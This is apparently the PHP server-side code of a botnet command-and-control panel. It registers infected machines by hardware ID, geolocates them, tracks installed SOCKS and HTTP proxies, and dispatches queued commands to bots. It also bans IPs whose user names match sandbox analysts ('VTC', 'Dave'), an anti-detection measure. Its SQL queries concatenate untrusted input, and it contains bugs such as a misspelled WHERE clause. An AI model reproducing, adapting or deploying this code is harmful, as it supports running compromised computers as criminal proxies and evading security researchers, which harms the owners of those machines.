<?
	include_once('GeoIP.inc');
	include_once('config/config.php');
	include_once('security.php');
	include_once('global.php');
	
	class Bot
	{

		var $id, $keyarr, $defaults, $ip, $country, $countrycode, $hwid, $name, $os, 
			$socks, $s4, $s5, $https, $admin, $idcommand, $ram, $total, $result, $category,
			$useragents;
		
		function __construct($key){
			$global = new GlobalCore;
			//$global->CheckRam();
			$sec = new Security('');
			$this->ip = $_SERVER['REMOTE_ADDR'];

			$this->defaults = trim(strrev(base64_decode($key)));
			//$this->defaults =  str_replace(array("[System Process]\r\n","System\r\n"), '', $this->defaults);
		//	$counts = substr_count($this->defaults, 'svchost.exe');
			//$svchost = 'svchost.exe ('.$counts.')';
			//..$this->defaults =  str_replace("svchost.exe\r\n", '', $this->defaults);
 			
			
			
			
			$this->keyarr =  json_decode( $this->defaults, true);
			
		
				$this->hwid = trim($this->keyarr['hwid']);
				if(array_key_exists('ram', $this->keyarr)){
					$this->name = $this->keyarr['UserName'];
				} else {
					$this->name = '';
				}
				$this->admin = $this->keyarr['Admin'];
				$this->os = mb_substr($this->keyarr['win'], 0, -1);
				$this->s4 = $this->keyarr['s4'];
				$this->s5 = $this->keyarr['s5'];
				$this->https = $this->keyarr['http'];

				if(array_key_exists('ram', $this->keyarr)){
					if (strlen($this->keyarr['ram'])>0){
						
						
						
						$value1 = substr($this->keyarr['ram'], 0, 1);
						$value2 = substr($this->keyarr['ram'], 1, 1);
						
						$two_byte = $value1.$value2;
						
						if ((intval($two_byte) > 12) or (intval($two_byte) < 17)) $this->keyarr['ram'] = floor(intval($this->keyarr['ram']) / 1000);
						if ((intval($two_byte) > 10) or (intval($two_byte) < 12)) $this->keyarr['ram'] = floor(intval($this->keyarr['ram']) / 1000);
						
						if (is_numeric($value1))
						{
							if(intval($value2) == 0) $value2 = '';
							if(intval($value2) > 0) $value2 = '.' .$value2;
						
							$this->ram = $value1 . $value2 . 'GB';
						
						}
					}
					
				} else {
					
					$this->ram = 'ERROR';
					
				}
				
				if(array_key_exists('total', $this->keyarr)){
					$this->total = $this->keyarr['total'];
				} else {
					$this->total = '';
				}
				$this->category = $global->move_list;
				if((strlen($this->s4)>0) || (strlen($this->https)>0)) $this->socks = 1;  
				
				
				if(strlen($this->keyarr['UserName'])>0){
					if(array_search('vtc', $this->keyarr, true)){ $sec->AddToBase($this->ip, 'Запрещённое имя VTC'); }
					//if($sec->MatchName($this->name)==true){ $sec->AddToBase($this->ip, 'Обнаружено закодированное имя:'.$this->keyarr['UserName'].''); }
					if(array_search('Dave', $this->keyarr, true)){ $sec->AddToBase($this->ip, 'Запрещённое имя Dave'); }
				}
				
				$this->id = $this->GetBotID($this->hwid);
				if(empty($this->keyarr)){ 
					$sec->AddToBase($this->ip, '[Анти-Детект] - кто-то пытался зайти без параметров');
					$this->result = false;
				} else {
						$this->result = true;
				}
		}
		
		public function isJson($string) {
 		   return ((is_string($string) && (is_object(json_decode($string)) || is_array(json_decode($string))))) ? true : false;
		}
		
		public function datetime()
		{
			return date('Y-m-d H:i:s');
		}
		
		public function GetUserAgents(){
			
				$i = 0;
				
					$var_a = array(
									0  => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
									1  => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36',
									2  => 'Mozilla/5.0 (compatible; Googlebot/2.1)',
									3  => 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_2; en-gb) AppleWebKit/526+ (KHTML, like Gecko) Version/3.1 iPhone',
									4  => 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19',
									5  => 'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20180115',
									6  => 'Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
									7  => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
									8  => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.A.B.C Safari/525.13',
									9  => 'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
									10 => 'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
									11 => 'Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285',
									12 => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36',
									13 => 'Yandex/2.01.000 (compatible; Win16; Dyatel; C)',
									14 => 'Mozilla/5.0 (Linux; Android 5.0)'
								);
								
					foreach ($var_a as $value):
							
							$i++;
							
							$return = '['.$i.'='.$value.']';
							
					endforeach;
					
				return $return;
			
		}
		
		public function GetListName($hwid) {
			global $mysqli;
			$sql  = 'SELECT * FROM darksky_users WHERE hwid='.$hwid;
			$result = $mysqli->query($sql);
			if($result){
			$row = $result->fetch_row();
			return $row[18];
			} else {
				return '0';
			}
			$mysqli->close();
		}
		
		public function AddUser(){
		global $mysqli;
		
		$add = 'INSERT INTO darksky_users (`id`, `time`, `ip`, `hwid`, `country`, `countrycode`, `os`, `userpc`, `status`, `isadmin`, `datereg`, `installed_socks`, `s4`, `s5`, `https`, `ram`, `category`) VALUES ';
			
			$gi = geoip_open('modules/GeoIP.dat', GEOIP_STANDARD);
			$this->countrycode = strtolower(geoip_country_code_by_addr($gi, $this->ip));
        	$this->country = geoip_country_name_by_addr($gi, $this->ip);
			geoip_close($gi);
			
			
			if ($this->countrycode == NULL) { $this->countrycode = 'XX'; }
			if ($this->country == NULL) { $this->country = 'Unknow'; }
			
		if ($this->name == 'VBS') {
			
			$ip_counters = $this->CheckIP();
			
			if ($ip_counters==0){
				
			//	if ($this->CheckByName($this->name) !== 0){
					
					$vb_add = $add . '(NULL, "'.time().'", "'.$this->ip.'", "'.$this->hwid.'", "'.$this->country.'", "'.$this->countrycode.'", "'.$this->os.'",
				"'.$this->name.'", "1", "'.$this->admin.'", "'.$this->datetime().'", "'.$this->socks.'", "'.$this->s4.'", "'.$this->s5.'", "'.$this->https.'", "'.$this->ram.'", "0")';
						return  $mysqli->query($vb_add);

			//	}
				
			} else {
			
					if ($ip_counters == 1) {
					
					$vb_up = 'UPDATE `darksky_users` SET time="'.time().'", ip="'.$this->ip.'", country="'.$this->country.'", countrycode="'.$this->countrycode.'",
						os="'.$this->os.'", userpc="'.$this->name.'", status="1", isadmin="'.$this->admin.'", installed_socks="'.$this->socks.'", s4="'.$this->s4.'",
						s5="'.$this->s5.'", https="'.$this->https.'", ram="'.$this->ram.'", category="'.$this->category.'" WHERE `userpc`="'.$this->name.'" AND `ip`="'.$this->ip.'"';
					return $mysqli->query($vb_up);
					
				}
				
			}
			
		} else {
			
			if($this->ExistsUser($this->hwid) == 0):
			
				$sql_add = $add . '(NULL, "'.time().'", "'.$this->ip.'", "'.$this->hwid.'", "'.$this->country.'", "'.$this->countrycode.'", "'.$this->os.'",
				"'.$this->name.'", "1", "'.$this->admin.'", "'.$this->datetime().'", "'.$this->socks.'", "'.$this->s4.'", "'.$this->s5.'", "'.$this->https.'", "'.$this->ram.'", "0")';
						return  $mysqli->query($sql_add);
						$this->id = $this->GetBotID($this->hwid);
			else:
		
				$sql1 = 'UPDATE `darksky_users` SET time="'.time().'", ip="'.$this->ip.'", country="'.$this->country.'", countrycode="'.$this->countrycode.'",
					os="'.$this->os.'", userpc="'.$this->name.'", status="1", isadmin="'.$this->admin.'", installed_socks="'.$this->socks.'", s4="'.$this->s4.'",
					s5="'.$this->s5.'", https="'.$this->https.'", ram="'.$this->ram.'", category="'.$this->category.'" WHERE hwid="'.$this->hwid.'"';
				return $mysqli->query($sql1);
				
			endif;
			
			}
			$mysqli->close();
		}
	
		public function CheckLastSeen($id){
		global $mysqli;
		$sql  = 'SELECT * FROM `darksky_users` WHERE `time` > (UNIX_TIMESTAMP()-1800) and `id`='.$id;
		$get = $mysqli->query($sql);
		if( ($get == true) or ($get > 0) ){
			return true;
		} else {
			return false;
		}
		}
		
		public function BannedSet($id){
		global $mysqli;
		$sql = 'UPDATE `darksky_users` SET banned="1" WHRERE id = "'.$id.'" ';
		$mysqli->query($sql);
		return true;
		}
		
		public function DeleteUser2($hwid){ //return num in massiv
			global $mysqli;
			$sql  = 'DELETE FROM darksky_users WHERE hwid= "'.$hwid.'"';
			$res = $mysqli->query($sql);
			//if($result>1) 
			return true;
			$mysqli->close();
		}
		
		public function ExistsUser($hwid){
		global $mysqli;
		$sql_check = 'SELECT * FROM `darksky_users` WHERE hwid="'.$hwid.'" ;';
		$res = $mysqli->query($sql_check);
		$result = $res->num_rows;
		return $result;
		$mysqli->close();
		}
		
		public function CheckByName($name){
		global $mysqli;
		$sql_check = 'SELECT * FROM `darksky_users` WHERE userpc="'.$name.'" ;';
		$res = $mysqli->query($sql_check);
		$result = $res->num_rows;
		return $result;
		$mysqli->close();
		}
		
		public function CheckIP(){
		global $mysqli;
		$sql_check = 'SELECT * FROM `darksky_users` WHERE `userpc`="VBS" AND `ip`="'.$this->ip.'"';
		$res = $mysqli->query($sql_check);
		$result = $res->num_rows;
		return $result;
		$mysqli->close();
		}
		
		public function GetBotID(){
		global $mysqli;
		$sql_check = 'SELECT * FROM `darksky_users` WHERE hwid="'.$this->hwid.'";';
		$res = $mysqli->query($sql_check);
			$row = $res->fetch_row();
			if($row > 0){
				return $row[0];
			} else {
				return $row[0];
			}
		$mysqli->close();
		}
		
		public function GetCMD($id){
		global $mysqli;
			$sql_check = 'SELECT * FROM `darksky_users` WHERE hwid="'.$this->hwid.'";';
			$res = $mysqli->query($sql_check);
			$row = $res->fetch_row();
			if($row > 0){
				return $row[0];
			} else {
				return $row[0];
			}
		$mysqli->close();
		}
		
		public function SelectAllCommand($idbot){
		global $mysqli;
		$index = 0;
		$cmds= array();
		$sql = 'SELECT * FROM  `cmd` WHERE 1';
		$result = $mysqli->query($sql);
		
		while ($row = $result->fetch_assoc()){
		
				if(intval($row['forid']) == intval($idbot)):
					if(intval($row['amount']) > intval($row['done'])):
						$cmds[$index] = $row;
					else:
						if(intval($row['amount']) == 0):
							$cmds[$index] = $row;
						endif;
					endif;
				else:
			
				if(intval($row['amount']) > intval($row['done'])):
						$cmds[$index] = $row;
					else:
						if(intval($row['amount']) == 0):
							$cmds[$index] = $row;
						endif;
				endif;
			
				endif;
			$index++;
		}
			return $cmds;
			$mysqli->close();
		}
		
		public function SelectOneCommands(){
		global $mysqli;
		$index = 0;
		$cmds= array();
		$sql = 'SELECT * FROM  `cmd` WHERE amount = 0';
		$result = $mysqli->query($sql);
			while ($row = $result->fetch_assoc()){
				if ($row['amount'] > $row['done']):
					$cmds[$index] = $row;
				else:
					if ($row['amount'] == '0'):
						$cmds[$index] = $row;
					endif;
				endif;
				
				$index++;
			}
		return $cmds;
		$mysqli->close();
		}
		
		public function IsMarked($idsbot, $idscmd){
		global $mysqli;
		$sql = 'SELECT * FROM last_cmd WHERE idbot ='.$idsbot.' AND idcmd ='.$idscmd.'';
		$result = $mysqli->query($sql);
			if($result->num_rows == 0){
				return false;
			} else {
				return true;
			}
		$mysqli->close();
		}
		
		public function MarkSet($idbota, $idcmda){
		global $mysqli;
		$sql = "INSERT INTO `last_cmd` (`idbot`, `idcmd`, `viewed`) VALUES ('".$idbota."', '".$idcmda."', '1')";
		$result = $mysqli->query($sql);
		return true;
		$mysqli->close();
		}
		
		public function DoneUp($id){
		global $mysqli;
		$mysqli->query('UPDATE cmd SET `done` = `done` + 1 WHERE id='.$id);
		return true;
		$mysqli->close();
		}
		
		public function UserExit(){
			session_unset();
			session_destroy();
			return true;
		}
		

	}

?>